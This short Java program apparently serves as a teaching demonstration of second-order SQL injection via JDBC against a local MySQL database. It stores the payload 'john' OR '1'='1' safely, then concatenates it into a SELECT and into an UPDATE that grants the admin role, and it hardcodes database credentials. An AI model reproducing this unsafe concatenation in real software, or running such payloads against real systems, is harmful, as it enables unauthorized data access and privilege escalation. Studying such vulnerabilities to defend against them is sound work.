// Second-Order SQL Injection via JDBC
// Attacker stores malicious input in one step; it is executed later by a different query.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.Statement;

public class second_order_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // Step 1: malicious payload stored safely during registration
        PreparedStatement ps = con.prepareStatement(
                "INSERT INTO users (username, password) VALUES (?, ?)");
        ps.setString(1, "john' OR '1'='1");
        ps.setString(2, "secret");
        ps.executeUpdate();
        System.out.println("Payload stored safely in DB (first order: no injection)");

        // Step 2: stored value later concatenated unsafely -> second-order injection
        String stored = "john' OR '1'='1";
        String query = "SELECT * FROM users WHERE username = '" + stored + "'";
        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("Second-order hit: " + rs.getString("username"));
        }

        // Second-order in UPDATE
        String upd = "UPDATE users SET role='admin' WHERE username = '" + stored + "'";
        int rows = st.executeUpdate(upd);
        System.out.println("Rows escalated via stored payload: " + rows);

        rs.close();
        ps.close();
        st.close();
        con.close();
    }
}
